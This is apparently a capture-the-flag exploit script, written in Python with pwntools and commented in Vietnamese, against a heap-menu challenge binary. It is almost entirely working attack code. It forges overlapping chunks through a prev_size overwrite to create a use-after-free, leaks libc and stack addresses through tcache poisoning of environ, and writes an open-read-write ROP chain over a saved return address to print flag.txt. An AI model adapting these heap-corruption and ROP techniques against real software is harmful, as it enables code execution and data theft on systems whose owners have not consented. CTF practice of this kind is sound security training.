from pwn import *

context.log_level = 'info' 
context.arch = 'amd64'

exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(['./ld-linux-x86-64.so.2', './chall'], env={"LD_PRELOAD": "./libc.so.6"})
# Chạy thẳng remote nếu bạn muốn lấy cờ ngay!
# p = remote('chall.0xfun.org', 56680)

def add(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"Data: ", data) # Đã sửa thành Data: chuẩn xác

# ==================================================
# PHASE 1: OVERLAPPING CHUNKS (SIZE 0x38 BẤT TỬ)
# ==================================================
log.info("--- PHASE 1: TẠO FAKE UAF ---")

add(0, 0x4f8, b"A\n") 
# Dùng 56 bytes (0x38) để vượt qua mọi cơ chế căn lề của Glibc
add(1, 0x38, b"B\n")  
add(2, 0x4f8, b"C\n") 
add(3, 0x18, b"guard\n") 

delete(0)

# 0x500 (Chunk 0) + 0x40 (Chunk 1) = 0x540
payload = b"X" * 0x30 + p64(0x540)
edit(1, payload)

log.info("Kích hoạt gộp Chunk lùi...")
delete(2) # Bùm! UAF xuất hiện.


# ==================================================
# PHASE 2: LEAK LIBC & LEAK STACK
# ==================================================
log.info("--- PHASE 2: DÒ TÌM TỌA ĐỘ ---")
add(4, 0x4f8, b"D\n") # Đẩy chunk UAF xuống vị trí Chunk 1

show(1)
p.recvuntil(b"Data: ")
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x1e7b20 
log.success(f"Libc Base: {hex(libc.address)}")

# Leak Stack thông qua Tcache Poisoning (vào environ)
add(5, 0x28, b"T1\n")
delete(5)
show(5)
p.recvuntil(b"Data: ")
shift_key_5 = u64(p.recv(0x28)[:8])

target_env = (libc.symbols['environ'] - 0x10) & 0xfffffffffffffff0
offset_env = libc.symbols['environ'] - target_env
edit(5, p64(target_env ^ shift_key_5))

add(6, 0x28, b"A\n") 
add(7, 0x28, b"A\n") 

show(7)
p.recvuntil(b"Data: ")
raw_env = p.recv(0x28)
stack_leak = u64(raw_env[offset_env : offset_env + 8])
log.success(f"Stack Leak: {hex(stack_leak)}")


# ==================================================
# PHASE 3: ORW ROP CHAIN (MỞ - ĐỌC - GHI)
# ==================================================
log.info("--- PHASE 3: OPEN-READ-WRITE ---")

ret_addr = stack_leak - 0x150
target_rbp = ret_addr - 8 
log.success(f"Target RBP: {hex(target_rbp)}")

add(8, 0x108, b"R1\n")
delete(8)
show(8)
p.recvuntil(b"Data: ")
shift_key_8 = u64(p.recv(0x108)[:8])

# Trỏ thẳng kim tiêm vào RBP
edit(8, p64(target_rbp ^ shift_key_8))
add(9, 0x108, b"A\n") 

# Tự động hóa ROP Chain bằng Pwntools
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

# Ghi chuỗi "flag.txt" lên vùng nhớ tĩnh an toàn của Heap
flag_str_addr = target_rbp + 0x100 
fd = 3 # File descriptor khi open file đầu tiên thường là 3

# 1. OPEN: open("flag.txt", 0)
rop.open(flag_str_addr, 0)
# 2. READ: read(3, stack_leak, 100) -> Đọc cờ vào Stack
rop.read(fd, target_rbp, 100)
# 3. WRITE: write(1, stack_leak, 100) -> In cờ ra màn hình
rop.write(1, target_rbp, 100)

# Đóng gói Payload
payload = p64(stack_leak)      # Phục hồi RBP
payload += p64(ret_gadget)     # Căn lề Stack (Bảo hiểm)
payload += rop.chain()
payload = payload.ljust(0x100, b"\x00")
payload += b"flag.txt\x00"     # Đặt chữ flag.txt ở cuối Payload

log.info("Bắn ROP Chain nhặt cờ...")
add(10, 0x108, payload)

print("\n>>> KẾT QUẢ TỪ SERVER <<<")
print(p.recvall(timeout=3).decode('utf-8', errors='ignore'))